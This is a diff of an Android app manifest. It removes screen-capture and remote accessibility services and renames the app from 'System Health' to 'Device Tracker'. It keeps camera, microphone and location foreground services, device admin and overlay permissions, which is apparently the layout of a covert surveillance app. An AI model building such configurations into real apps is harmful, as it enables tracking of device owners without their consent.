@@ -34,10 +34,8 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
 
     <!-- Device Admin -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
@@ -51,32 +49,13 @@
     <application android:allowBackup="false"
                  android:supportsRtl="true"
                  android:usesCleartextTraffic="true"
-                 android:label="System Health">
+                 android:label="Device Tracker">
 
         <!-- Update Service (Foreground) -->
         <service
             android:name=".UpdateService"
             android:foregroundServiceType="dataSync|location|camera|microphone"
             android:exported="false" />
-
-        <!-- Screen Capture Service -->
-        <service
-            android:name=".Media.ScreenCaptureService"
-            android:foregroundServiceType="mediaProjection"
-            android:exported="false" />
-
-        <!-- Remote Accessibility Service -->
-        <service
-            android:name=".RemoteAccessibilityService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
 
         <!-- Device Admin -->
         <receiver
@@ -125,7 +104,7 @@
         <!-- Activity -->
         <activity android:name=".MainActivity"
               android:exported="true"
-               android:label="System Health">
+              android:label="Device Tracker">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
